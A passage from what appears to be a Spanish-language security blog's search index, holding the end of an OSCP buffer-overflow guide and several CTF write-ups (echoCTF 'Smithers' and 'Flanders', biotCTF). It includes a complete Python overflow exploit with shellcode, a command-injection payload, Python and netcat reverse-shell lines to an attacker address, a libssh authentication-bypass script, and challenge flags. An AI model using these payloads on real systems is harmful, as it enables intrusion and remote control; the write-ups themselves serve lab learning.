LPORT=\u0026lt;puerto\u0026gt; -b '\\x00' EXITFUNC=thread -i 3 -f python \u0026gt; scode.txt\nTener en consideración:\n Sistema operativo. Arquitectura. Payload. Formato (python, c, exe, etc). Variables de escucha y/o comando a ejecutar. Encoding (extra: -i 3 para número de iteraciones para encodear). BadChars. Función de salida (para evitar que el proceso termine usar seh o thread).  Si se da el caso que los badchars sean bastantes tal que la generación del shellcode no se realice satisfactoriamente, considerar quitar el encoder x86/shikata_ga_nai para que automáticamente se utilicé el encoder que cumpla con los requisitos (colección de badchars a evitar).\nGeneración de exploit Ejemplo de exploit final from struct import pack import socket, sys if len(sys.argv) \u0026lt; 2: print \u0026#34;\\n[!] Uso: python \u0026#34; + sys.argv[0] + \u0026#34;\u0026lt;ip-address\u0026gt;\u0026#34; + \u0026#34;\u0026lt;remote-port\u0026gt; \\n\u0026#34; sys.exit(0) ip_address = sys.argv[1] rport = int(sys.argv[2]) shellcode = b\u0026#34;\u0026#34; shellcode += b\u0026#34;\\xb8\\x36\\xda\\x75\\x0f\\xda\\xd5\\xd9\\x74\\x24\\xf4\\x5b\\x2b\u0026#34; shellcode += b\u0026#34;\\xc9\\xb1\\x5f\\x83\\xc3\\x04\\x31\\x43\\x10\\x03\\x43\\x10\\xd4\u0026#34; shellcode += b\u0026#34;\\x2f\\xce\\x68\\xaf\\x10\\x8c\\xac\\x01\\x49\\x9b\\x76\\x69\\x30\u0026#34; shellcode += b\u0026#34;\\x55\\xbe\\x20\\x9d\\xa4\\x1a\\x57\\x9d\\x2d\\x66\\x54\\xfb\\xa0\u0026#34; shellcode += b\u0026#34;\\x75\\xc8\\xf6\\x32\\x68\\x08\\x59\\x9b\\x32\\x1d\\xb8\\x35\\x8a\u0026#34; shellcode += b\u0026#34;\\x2e\\x1c\\xec\\x8c\\x49\\xea\\xa6\\xae\\xc5\\xfb\\xef\\x11\\xbd\u0026#34; shellcode += b\u0026#34;\\xa9\\x1f\\x9b\\xf3\\x51\\xc8\\x4a\\x27\\x35\\xa2\\xd1\\x60\\x03\u0026#34; shellcode += b\u0026#34;\\x55\\x72\\xf5\\xcc\\x0b\\xd2\\x2a\\xda\\x41\\x4d\\x5f\\x4f\\xb4\u0026#34; shellcode += b\u0026#34;\\x2f\\xbb\\xc6\\x88\\x45\\x5f\\x3e\\x11\\x08\\x86\\x09\\x5d\\xe7\u0026#34; shellcode += b\u0026#34;\\xf8\\x11\\x49\\x5c\\x12\\xdc\\x8e\\x66\\xa0\\x1e\\x1c\\x10\\x0a\u0026#34; shellcode += b\u0026#34;\\xf8\\xa7\\xac\\x6b\\x8d\\xd4\\x2a\\xaa\\xe6\\x5e\\x9d\\xbe\\x04\u0026#34; shellcode += b\u0026#34;\\x42\\x52\\xe0\\x71\\x86\\xc5\\xa6\\xa2\\xff\\xdf\\xcb\\x75\\x28\u0026#34; shellcode += b\u0026#34;\\x2f\\x5b\\x05\\x57\\x39\\x45\\xd2\\x7e\\x05\\xd6\\x91\\xfd\\x46\u0026#34; shellcode += b\u0026#34;\\x2c\\x31\\x66\\xea\\xbe\\x3c\\xc8\\x10\\x96\\xf6\\xcc\\x31\\xbc\u0026#34; shellcode += b\u0026#34;\\x56\\x43\\x24\\x1f\\x86\\xed\\xf2\\x59\\xa2\\x38\\x9c\\x4f\\xa1\u0026#34; shellcode += b\u0026#34;\\xc6\\x58\\x71\\xb7\\x81\\x9d\\xe3\\x25\\xb7\\xc7\\xf4\\x5c\\xa3\u0026#34; shellcode += b\u0026#34;\\x01\\xd4\\x5e\\xf2\\x1d\\x92\\x57\\x08\\x65\\xd9\\x62\\xdf\\xb4\u0026#34; shellcode += b\u0026#34;\\xdf\\xaa\\xb8\\x6a\\x61\\x82\\x87\\xfa\\x27\\x0c\\xe9\\x49\\x46\u0026#34; shellcode += b\u0026#34;\\xea\\x50\\x51\\xb6\\x6b\\xc9\\xbc\\xe4\\x95\\xff\\xf8\\x36\\x94\u0026#34; shellcode += b\u0026#34;\\x3b\\xbd\\x24\\xd9\\x9c\\xb5\\x1e\\x77\\xcb\\x31\\x84\\x2a\\xe3\u0026#34; shellcode += b\u0026#34;\\xca\\xac\\xd7\\x8c\\x12\\xed\\xa0\\x53\\xfa\\xbc\\x94\\xf3\\x9b\u0026#34; shellcode += b\u0026#34;\\xe5\\x8a\\xac\\xf3\\x48\\x1a\\x39\\x2e\\x63\\x5a\\x68\\xe9\\x85\u0026#34; shellcode += b\u0026#34;\\x93\\xde\\x3a\\x22\\x77\\x2a\\xac\\xa1\\xfa\\x96\\x7f\\x9f\\x95\u0026#34; shellcode += b\u0026#34;\\x6f\\xa3\\xe4\\x13\\x41\\x9a\\xe8\\xf6\\x97\\x6b\\x2d\\x31\\x68\u0026#34; shellcode += b\u0026#34;\\x9c\\xb1\\x2f\\xab\\xa3\\xf5\\x56\\xe9\\xf5\\xa3\\x21\\xe9\\x9c\u0026#34; shellcode += b\u0026#34;\\x19\\xaf\\x10\\x57\\xfb\\x80\\x0e\\x73\\x48\\x84\\xb1\\xb0\\xb0\u0026#34; shellcode += b\u0026#34;\\x83\\x67\\x88\\xb5\\x1d\\x0e\\x73\\xeb\\xa1\\xd1\\xdc\\xa2\\xe9\u0026#34; shellcode += b\u0026#34;\\x76\\xcc\\xd0\\x27\\x6b\\xed\\x5d\\xfc\\x02\\xcb\\x8f\\xff\\xc3\u0026#34; shellcode += b\u0026#34;\\xb2\\x8f\\xf3\\xee\\x96\\x9a\\xec\\xb1\\x73\\x55\\x47\\x82\\x70\u0026#34; shellcode += b\u0026#34;\\x10\\x32\\x53\\xbb\\xfa\\x83\\x38\\x3b\\xb0\\xea\\xd1\\xe4\\x6e\u0026#34; shellcode += b\u0026#34;\\x2f\\x7d\\x23\\xc5\\xd9\\x5d\\xfb\\x48\\x06\\x3d\\x4f\\x33\\xfe\u0026#34; shellcode += b\u0026#34;\\x03\\x9c\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: #buffer = \u0026#34;A\u0026#34; * 1052 + pack(\u0026#34;\u0026lt;L\u0026#34;, 0x68a98a7b) + \u0026#34;\\x83\\xEC\\x10\u0026#34; + shellcode buffer = \u0026#34;A\u0026#34; * 1052 + pack(\u0026#34;\u0026lt;L\u0026#34;, 0x68a98a7b) + \u0026#34;\\x90\u0026#34; * 16 + shellcode try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip_address, rport)) s.send(\u0026#34;%s\\r\\n\u0026#34; % buffer) except Exception as ex: print \u0026#34;[!] Ha habido un error de conexion\u0026#34; print ex sys.exit(1) Consideraciones\nSi bien se pueden utilizar algunos \u0026ldquo;trucos\u0026rdquo; para caer en la dirección donde se encuentra el shellcode como lo son los NOPs (\\x90) se puede ocupar un desplazamiento de pila para restar posiciones, y jugar un poco con los valores. Dentro de msf-nasm_shell se puede invocar la instrucción sub esp, \u0026lt;valor en hexadecimal\u0026gt;. Ejemplo:\nEn este caso se obtendría el valor 83EC10 como código de operación para el desplazamiento de 10 unidades. quedando la línea de construcción del payload como: buffer = \u0026quot;A\u0026quot; * 1052 + pack(\u0026quot;\u0026lt;L\u0026quot;, 0x68a98a7b) + \u0026quot;\\x83\\xEC\\x10\u0026quot; + shellcode en lugar de los NOPs.\n","permalink":"https://rzul.me/posts/bof-oscp/","summary":"OSCP Metodología Stack Based Objetivo Como parte de la práctica para el examen me di a la tarea de realizar esta guía para futuras consultas y aclaración de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificación. Adicional, para tener un compendio más práctico realice un síntesis de los comandos utilizados disponibles en esta Cheat Sheet.\nConfiguración de ambiente de práctica  Deshabilitar firewall y/o habilitar reglas para comunicación a través de red.","title":"Buffer Overflow - OSCP"},{"content":"Estadísticas    Característica Descripción     Nombre smithers   Dificultad Beginner   Banderas 7 (5 other, env, root)   Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Like Smithers this server will serve you well only if you manage to enter it\u0026rsquo;s memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag.    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:45 CDT Initiating Connect Scan at 19:45 Scanning 10.0.100.142 [65535 ports] Discovered open port 11211/tcp on 10.0.100.142 Discovered open port 10888/tcp on 10.0.100.142 Completed Connect Scan at 19:45, 21.90s elapsed (65535 total ports) Nmap scan report for 10.0.100.142 Host is up, received user-set (0.14s latency). Scanned at 2021-10-14 19:45:20 CDT for 22s Not shown: 53830 closed ports, 11703 filtered ports Reason: 53830 conn-refused and 11703 no-responses Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 10888/tcp open unknown syn-ack 11211/tcp open memcache syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds Escaneo específico ❯ nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:46 CDT Nmap scan report for 10.0.100.142 Host is up (0.14s latency). PORT STATE SERVICE VERSION 10888/tcp open http nginx |_http-title: Network Tools 11211/tcp open memcached Memcached 1.5.12 (uptime 36084 seconds) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds Enumeración Servicios http - 10888 Manual Al navegar al sitio se visualiza algún tipo de servicio que pone a disposición utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en algún tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass básico a esta validación se decidió jugar un poco con cabeceras como X-Forwarded-For entre otras, para ver si la respuesta por parte del servidor cambiaba de algún modo, sin éxito aparente.\nmemcached - 11211 Manual Siendo permitida la conexión directa mal socket mediante netcat se permite la obtención de datos existentes en el servidor mediante comandos propios de memcached, datos como versión, estatus, slabs, items, entre otros.\nComandos útiles\nDespués de entablar la conexión\nversion # Obtener versión stats # Obtener estatus stats slabs # Obtener slabs stats items # Obtener items de slabs con información stats cachedump \u0026lt;numero_de_item\u0026gt; 0 # Obtener nombres de llaves (0 es para no limitar el tamaño del output) get \u0026lt;nombre_de_item\u0026gt; # Obtener información guardada de item Referencia: https://book.hacktricks.xyz/pentesting/11211-memcache\nRecalcando que para la obtención del número de item se puede extraer de la columna señalada del output generado por la obtención de los items.\nExplotación Habiendo encontrado que se puede exfiltrar información mediante la interacción con el servicio de memcached faltaría validar si también se puede configurar información en el servicio.\nAbuso de escritura de items en memcached Pasos previos | Preparación Dentro de la enumeración se encontró que la versión de memcached y la información contenida al navegar al sitio expuesto coincidía por lo que bajo la suposición de que estos dos interactuan entre sí y de no haber encontrado el item REMOTE_ADDR como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.\nSintaxis\nset key flags exptime bytes value Uso\nset REMOTE_ADDR 0 2592000 4 test Referencia: https://www.tutorialspoint.com/memcached/memcached_set_data.htm\nAl tener problemas de interacción directa para configurar los valores se encontraron otras alternativas funcionales.\nMétodo 1 Comando\necho -e 'set REMOTE_ADDR 0 2592000 4\\r\\ntest\\r' | nc -nv -w 1 10.0.100.142 11211\n Ejecución. Validación de existencia (cuando antes no se desplegaba el item 1). Obtención de valor de valor.  Método 2 El paquete libmemcached-tools cuenta con utilidades para interactuar con conexiones de memcached. Haciendo uso de memccp se puede copiar un valor pasando como parámetro el archivo con el valor que se piensa ocupar y haciendo uso de memcat para la visualización de los valores de los items.\nsudo apt install libmemcached-tools echo -n \u0026#34;test2\u0026#34; \u0026gt; REMOTE_ADDR memccp --servers=10.0.100.142 REMOTE_ADDR memccat --servers=10.0.100.142 REMOTE_ADDR Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/\nEjecución Configurando la variable que concuerda con ambos servicios y añadiendo la asignada por la vpn el output de la página resulta diferente.\nA partir de este punto se puede observar que se habilita un formulario para realizar un ping a un host, lo que a nivel de código se puede reducir en algo como:\n$ip = \u0026#34;valor proporcionado por formulario\u0026#34; system(\u0026#39;ping \u0026#39; . $ip); Lo que al final se reduciría en ejecución remota de comandos, ya que en consola podemos usar \u0026ldquo;separadores\u0026rdquo; para ejecutar múltiples comandos en una misma instrucción, lo que a nivel de código se ejemplificaría en ping 127.0.0.1; whoami.\nAl ver el servicio lo ejecuta directamente root, al obtener una reverse shell, no se requiriría proceso de escalación de privilegios.\nAl realizar la prueba para obtener una reverse shell con netcat usando ;nc -e /bin/bash 10.10.0.26 1234 no se ejecutó satisfactoriamente por lo que se optó intentar con diferentes alcances, siendo python3 el funcional (;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.0.26\u0026quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;sh\u0026quot;)').\nUbicación de banderas  Llave - valor de memcached. /var/lib/nginx/html/network-tools.php x 3. / Extrayendo las variables de entorno de los procesos en ejecución con strings /proc/*/environ | grep ETSCTF. /root.  ","permalink":"https://rzul.me/posts/echoctf_smithers/","summary":"Estadísticas    Característica Descripción     Nombre smithers   Dificultad Beginner   Banderas 7 (5 other, env, root)   Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Like Smithers this server will serve you well only if you manage to enter it\u0026rsquo;s memcached store. The memcache service you just discovered on smithers.","title":"echoCTF - Smithers"},{"content":"Estadísticas    Característica Descripción     Nombre flanders   Dificultad Beginner   Banderas 4 (2 system, env, root)   Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is Okily Dokily. Catch phrase sounds like a pass phrase, only without space    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:35 CDT Initiating SYN Stealth Scan at 09:35 Scanning 10.0.100.34 [65535 ports] Discovered open port 6022/tcp on 10.0.100.34 Completed SYN Stealth Scan at 09:35, 14.77s elapsed (65535 total ports) Nmap scan report for 10.0.100.34 Host is up, received user-set (0.14s latency). Scanned at 2021-10-27 09:35:04 CDT for 15s Not shown: 65534 closed ports Reason: 65534 resets PORT STATE SERVICE REASON 6022/tcp open x11 syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds Raw packets sent: 72729 (3.200MB) | Rcvd: 70809 (2.832MB) Escaneo específico ❯ nmap -sCV -p 6022 -oN nmap/targeted $BOX_TARGET Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:48 CDT Nmap scan report for 10.0.100.34 Host is up (0.14s latency). PORT STATE SERVICE VERSION 6022/tcp open ssh libssh 0.8.1 (protocol 2.0) | ssh-hostkey: |_ 2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4.85 seconds Enumeración Servicios (nombre - puerto) ssh - 6022 Manual Dado el reconocimiento por medio de nmap se puede identificar que se está corriendo un servidor ssh en un puerto no convencional y se expone la versión libssh 0.8.1, después de una búsqueda se puede identificar que la versión expuesta cuenta con una vulnerabilidad la cuál explota un bypass de autenticación, reportada en el CVE-2018-10933.\nSe encontraron diversos scripts en python que abusan de la vulnerabilidad:\n https://www.exploit-db.com/exploits/45638 https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d  Explotación libSSH Authentication Bypass Pasos previos | Preparación Como parte de los scripts buscados se encontró el siguiente código en un script que resultó bastante simple de ejecutar, únicamente realizando los cambios pertinentes de ip, puerto y comando (entablando una reverse shell).\nScript\n#!/usr/bin/python3 import sys import paramiko import socket s=socket.socket() s.connect((\u0026#34;10.0.100.34\u0026#34;,6022)) m=paramiko.message.Message() t=paramiko.transport.Transport(s) t.start_client() m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS) t._send_message(m) c=t.open_session(timeout=5) c.exec_command(\u0026#34;nc -e /bin/bash 10.10.0.26 1234\u0026#34;) out=c.makefile(\u0026#34;rb\u0026#34;,2048) output=out.read() out.close() print (output) Ejecución  Ejecución de script. Listener de reverse shell.  Post Explotación Enumeración Realizando enumeración manual se puede observar que el directorio principal del usuario al que se accede ETSCTF contiene una llave ssh que a primera impresión apuntaría a un método de escalación de privilegios a root.\n Directorio. Llave. Usuario al que pertenece.  Escalación de privilegios ETSCTF → root La idea inicial a seguir sería extraer la llave encontrada para intentar acceder al sistema con ella, dado que ningún intento funcionó, se puede tratar de ubicar si existe algún otro medio de acceso a la máquina por el cuál esté restringida a conexiones provenientes únicamente desde local, es decir, de flanders hacia flanders. Para comprobar esto se puede buscar si algún servicio de ssh está ejecutandose y si existe algún puerto que esté a la escucha de nuevas conexiones.\nLa salida del comando mapea automáticamente los puertos comúnes para el servicio siendo así que 127.0.0.1:ssh sería lo mismo que 127.0.0.1:22, verificando de esta manera que se escuchan conexiones ssh localmente.\nEn esta comprobación se puede ver que se está ejecutando sshd correspondiente al servidor de ssh en linux.\nSe suelen proteger las llaves ssh con passphrases y observando que en la descripción de la máquina se proporciona una passphrase (Okily Dokily) se pudiera concluir que al hacer uso de la llave se pedirá.\nLogrando así satisfactoriamente la escalación de privilegios.\nUbicación de banderas  /etc/passwd. /etc/shadow. Extrayendo las variables de entorno de los procesos en ejecución con strings /proc/*/environ | grep ETSCTF. /root.  ","permalink":"https://rzul.me/posts/echoctf_flanders/","summary":"Estadísticas    Característica Descripción     Nombre flanders   Dificultad Beginner   Banderas 4 (2 system, env, root)   Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is Okily Dokily. Catch phrase sounds like a pass phrase, only without space    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn).","title":"echoCTF - Flanders"},{"content":"Intro Dándole continuidad a las prácticas y CTFs en los que he participado, el pasado 19 de junio no fue la excepción. El nivel de dificultad, desde mi perspectiva, lo consideré amigable para los principiantes por lo que para quién se encuentra tratando de pulir habilidades fue un buen reto. Desafortunadamente no pude recopilar más información de sus creadores, más que la que está disponible en su página de twitter, un colega me puso al tanto de la info y decidimos tomar el reto.\nAgradecimientos Como ya lo mencioné antes, fue él quien me compartió la bases del CTF y pudimos participar en conjunto, no por el fin de buscar ganar si no de pasarla bien, aprender cosas nuevas y poner en práctica lo que llevamos estudiando. Muchas gracias por el tiempo dedicado en conjunto, saludos.\n D4rk》C0d3  Android Adivinar [500 pts] Descripción  No dejes que tus intentos se agoten\n adivina.apk\nPistas\nSolución La forma de resolver el reto pareciera no ser muy limpia o intencionada por el autor pero la forma como se resolvió fue haciendo reversing al apk dado, utilizando la herramienta apktool. Según la descripción dada por el sitio de la herramienta, permite la \u0026ldquo;decodificación\u0026rdquo; de los recursos del apk casi como los originales, por lo que al desempaquetarla y hacer una búsqueda del formato de banderas que ya se conoce entre los archivos resultantes se encontró la bandera.\nC:\\Users\\SrRequiem\\Desktop\u0026gt;apktool d adivina.apk I: Using Apktool 2.5.0 on adivina.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\\Users\\SrRequiem\\AppData\\Local\\apktool\\framework\\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... C:\\Users\\SrRequiem\\Desktop\\adivina\u0026gt;findstr /S \u0026#34;biotCTF{\u0026#34; * res\\values\\strings.xml: \u0026lt;string name=\u0026#34;Rflag\u0026#34;\u0026gt;biotCTF{4ndr01d_3s_d1v3rt1d0}\u0026lt;/string\u0026gt; Flag  biotCTF{4ndr01d_3s_d1v3rt1d0}\n Android J2 [200 pts] Descripción Gato.apk\nPistas\nSolución Al igual que el reto de adivina, se utilzó la herramienta apktool para realizar exactamente el mismo proceso, extracción/reversing de la apk y búsqueda de formato de bandera.\nC:\\Users\\SrRequiem\\Desktop\u0026gt;apktool d Gato.apk I: Using Apktool 2.5.0 on Gato.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\\Users\\SrRequiem\\AppData\\Local\\apktool\\framework\\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... C:\\Users\\SrRequiem\\Desktop\\Gato\u0026gt;findstr /S \u0026#34;biotCTF{\u0026#34; * smali\\biot\\ctf\\gato\\MainActivity$inicializarListeners$2.smali: const-string v0, \u0026#34;El jugador 2 gano! biotCTF{4ndr01d_j2_kl0t1n}\u0026#34; Flag  biotCTF{4ndr01d_j2_kl0t1n}\n Crypto Json Walter Tarantino [100 pts] Descripción  Json quiere trabajar en Biot, pero para aprobar, necesita romper el siguiente hash ¡ayuda a json a conseguir un empleo! eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiYmlvdENURntqczBuX3czYl9UMGszbl9iMTB0fSIsInVzZXIiOiJOM3VUcjBuIiwiZXhwIjoyMDA1MDMzNDkzfQ.jGtv9gJt5qKvTyHLFTM3kWNz8A88Qb0V3FS9HwTNNy0\n Pistas\nSolución Por la pista del nombre del reto y el formato dado del \u0026ldquo;hash\u0026rdquo; se puede concluir que la cadena dada es un Json Web Token (JWT) por lo que al copiar y pegar la cadena en https://jwt.io/ nos muestra la información decodificada, mostrando así la bandera.\nFlag  biotCTF{js0n_w3b_T0k3n_b10t}\n Forense Escáner Código de Barra [300 pts] Descripción  Hay algo raro en mi teléfono, no reconoce este código de barras. ¿Puedes intentarlo?.\n Pistas\nSolución Realizando un análisis de la imagen dada se puede ver que los bordes del código de barras dado, termina en blanco lo cuál es raro dado que eso no se ve comúnmente, inicialmente se trató de de recortar la imagen para eliminar esos \u0026ldquo;bordes\u0026rdquo; sin éxito alguno, por lo que posteriormente se intentó a realizar una inversión de colores de la imagen original utilizando esta herramienta online.\nImagen generada\nPara después decodificar el código de barras generado, subiendo la imagen a decodificar en esta herramienta. Obteniendo así la bandera.\nFlag  biotCTF{c0d1g0_1nv3rt1d0_b10t}\n Usuario John64 [100 pts] Descripción  ayudemos a Jonh a recuperar la flag oculta.\n john.txt\nPistas\nSolución Inicialmente se puede observar que el contenido del archivo es una cadena en base64, la cuál, al decodificarla se pueden ver carácteres no imprimibles e imprimibles por lo que se puede concluir que el contenido es un archivo, al hacer el pipe correspondiente se observa que es un archivo de tipo rar protegido con contraseña siendo que dentro de este se pueden ver los nombres de los archivos que contiene. Por lo que el paso siguiente a partir de este punto es realizar tarea de cracking del archivo para poder extraer sus contenidos.\n┌──(kali㉿kali)-[~/Desktop] └─$ cat john.txt | base64 -d Rar!▒3��� ����cU\u0026lt;�� ���flag.txt0�_\u0026#34;��\u0026lt;��c�B`m?�y��ETX���9Af!���Ci�3��R�f�� ���/�a�)�H-�U�▒���y�WKsr�#��} �AƂn�����T��l8�wVQ ┌──(kali㉿kali)-[~/Desktop] └─$cat john.txt | base64 -d \u0026gt; john.file ┌──(kali㉿kali)-[~/Desktop] └─$file john.file john.file: RAR archive data, v5 ┌──(kali㉿kali)-[~/Desktop] └─$strings john.file Rar! flag.txt0 B`m? 9Af! WKsr Flag  biotCTF{jh0n_th3_b10t}\n Visión túnel Biot [200 pts] Descripción  Encontramos estos archivos. Recupera la bandera.\n Pistas\nSolución Flag  biotCTF{f0rm4t0_bmp_b10t}\n OSINT Twitter [150 pts] Descripción  Ya est\\xc3\\xa1n abiertos los registros para BIOTCTF.\\r\\nme gusta mucho esa imagen.\n Pistas\n       Solución Flag Redes Ess id concatenado [200 pts] Descripción   Pistas\n       Solución Flag Hiper [100 pts] Descripción   Pistas\n       Solución Flag Stego Spectro [100 pts] Descripción   Pistas\n       Solución Flag Web A romper el Hash [100 pts] Descripción  ¿Te gusta la caza de recompensas? ¡A mi también! Encontré este inicio de sesión interno de BiOt. Este es un inicio de sesión solo con contraseña, ¿puedes descifrar el pase?. http://3.135.19.159/crack/index.php\n Pistas\n http://3.135.19.159/crack/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Crack the Password\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #0fbcf9;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;?php include \u0026#34;flag.php\u0026#34;; if($_POST[\u0026#34;password\u0026#34;]){ $password = $_POST[\u0026#34;password\u0026#34;]; if(md5($password) == \u0026#34;5e9f9f8023e802fa095df77507ab5ad6\u0026#34;){ echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); }else{ echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Password login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Flag  biotCTF{h4sh_d3c1fr4d0_b10t}\n Bypass como un 1337 [300 pts] Descripción  Estoy empezando a creer que ya no existe un verdadero 1337, ¿lo vales o no? Prueba tu mismo. http://3.135.19.159/bypass/index.php\n Pistas\n http://3.135.19.159/bypass/index.php?codigo_fuente  index.php?codigo_fuente\nCódigo pendiente\nSolución El camino a la explotación era por medio de una mala implementación de la función extract() de PHP, la cuál permite la modificación de las variables declaradas con anterioridad. Por lo que al modificar una variable designada, se podía hacer bypass de una validación que el código hacía. Se utilizó este artículo para obtener la bandera, el cuál explica más a detalle la vulnerabilidad.\nFlag  biotCTF{byp4ss_b10t_1337_s1}\n Magia [200 pts] Descripción  ¿¡Que tipo de magia es esto!?, yo si creo en la magia ¿y tú?. http://3.135.19.159/magic/index.php\n Pistas\n http://3.135.19.159/magic/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; 